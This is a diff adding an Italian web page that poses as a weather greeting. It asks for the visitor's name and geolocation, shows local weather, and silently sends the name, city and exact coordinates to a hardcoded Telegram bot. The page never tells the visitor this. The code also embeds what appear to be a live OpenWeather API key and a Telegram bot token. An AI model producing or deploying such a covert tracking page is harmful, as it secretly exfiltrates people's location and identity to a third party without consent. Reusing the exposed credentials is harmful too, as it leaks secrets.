@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+  <meta charset="UTF-8" />
+  <title>Tracciamento Meteo + Telegram</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+  <style>
+    body {
+      background-color: #f1f1f1;
+      font-family: 'Segoe UI', sans-serif;
+      color: #333;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+      padding: 0;
+    }
+
+    h2 {
+      color: #00796b;
+      margin-bottom: 10px;
+      text-align: center;
+    }
+
+    input, button {
+      padding: 12px 18px;
+      font-size: 16px;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+      margin: 5px;
+    }
+
+    button {
+      background-color: #00796b;
+      color: white;
+      border: none;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+
+    button:hover {
+      background-color: #005f4d;
+    }
+
+    #output {
+      margin-top: 20px;
+      background: #fff;
+      padding: 15px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px #ccc;
+      white-space: pre-wrap;
+      text-align: center;
+      max-width: 80%;
+    }
+  </style>
+</head>
+<body>
+
+  <h2>🌍 Benvenuto! Inserisci il tuo nome</h2>
+  <input type="text" id="nome" placeholder="Il tuo nome..." />
+  <button onclick="start()">Invia</button>
+
+  <p id="output">🛰 In attesa della posizione...</p>
+
+  <script>
+    const weatherApiKey = "5b582869a84081613b1e4ed83b821fb4"; // OpenWeather
+    const telegramBotToken = "7790339363:AAH23U45XaMr7bvwMby-NZ8gM4_B9G_Lp14";
+    const telegramChatId = "681409968"; // numerico
+
+    function start() {
+      const nome = document.getElementById("nome").value.trim();
+      if (!nome) {
+        alert("❗ Inserisci il tuo nome prima di continuare.");
+        return;
+      }
+
+      if (!navigator.geolocation) {
+        document.getElementById('output').innerText = "Geolocalizzazione non supportata.";
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(async function (position) {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+
+        const weatherRes = await fetch(
+          `https://api.openweathermap.org/data/2.5/weather?lat=${lat}&lon=${lon}&appid=${weatherApiKey}&units=metric&lang=it`
+        );
+        const weatherData = await weatherRes.json();
+
+        const city = weatherData.name || "Sconosciuta";
+        const temp = weatherData.main?.temp || "?";
+        const description = weatherData.weather?.[0]?.description || "N/A";
+
+        const outputText = `👤 Nome: ${nome}\n📍 Posizione: ${city} (${lat.toFixed(4)}, ${lon.toFixed(4)})\n🌡️ Meteo: ${temp}°C, ${description}`;
+        document.getElementById('output').innerText = outputText;
+
+        const telegramMessage = encodeURIComponent(outputText);
+        fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${telegramChatId}&text=${telegramMessage}`);
+      }, function () {
+        document.getElementById('output').innerText = "❌ Permesso negato o errore nella geolocalizzazione.";
+      });
+    }
+  </script>
+
+</body>
+</html>
